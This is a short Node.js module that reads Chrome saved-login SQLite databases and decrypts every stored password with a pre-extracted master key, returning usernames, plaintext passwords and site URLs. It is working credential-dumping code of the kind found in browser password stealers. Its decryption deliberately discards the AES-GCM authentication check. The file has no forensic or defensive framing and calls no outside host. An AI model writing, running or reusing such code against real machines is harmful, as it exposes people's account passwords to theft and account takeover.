//const sqlite3 = require('sqlite3').verbose();
const sqlite3 = require('better-sqlite3');
const crypto = require('crypto');
const fs = require('fs');
const bomstrip = require('bomstrip');

function getCredentials(path, jsonFile){
    let creds = [];
    let rawdata = fs.readFileSync(path + jsonFile);
    chrome = JSON.parse(rawdata.toString('utf8').replace(/^\uFEFF/, ''));
    var master = chrome.data["master_key.hexa"];
    for(var file in chrome.files){
        var db = new sqlite3(path + file);
        const rows = db.prepare("SELECT action_url as url, username_value as user , password_value as password, signon_realm as realm FROM logins").all();
        for(const pos in rows){
            let row = rows[pos];
            let cred = {};

            // Global stuff
            cred.category = chrome.category;
            cred.software = chrome.software;
            cred.version = chrome.version;
            // Custom one

            cred.username = row.user;
            if (row.password) {
                cred.password = decrypt_v80(row.password, master);
            }
            cred.assets = row.url;
            cred.realm = row.realm;

            creds.push (cred);
        }
    }
    return creds;
}
// Export the function for public access
module.exports.getCredentials = getCredentials;


function decrypt_v80(pass, master_key){
    let buff = Buffer.from(master_key, 'base64');
    const iv = Buffer.allocUnsafe(12);
    pass.copy(iv, 0, 3, 15);// pass.substr(3,15);
    const data = Buffer.allocUnsafe(pass.length - 15);
    pass.copy(data, 0, 15); // pass.substr(15);
    const decipher = crypto.createDecipheriv('aes-256-gcm', buff, iv);
    let str = decipher.update(data, 'hex', 'ascii');

    try{
    str += decipher.final('ascii');
    }catch(e) {/*Will throw execption because we dont have tag but we got our pass*/}
    
    return str.substring(0, str.length-16);
}

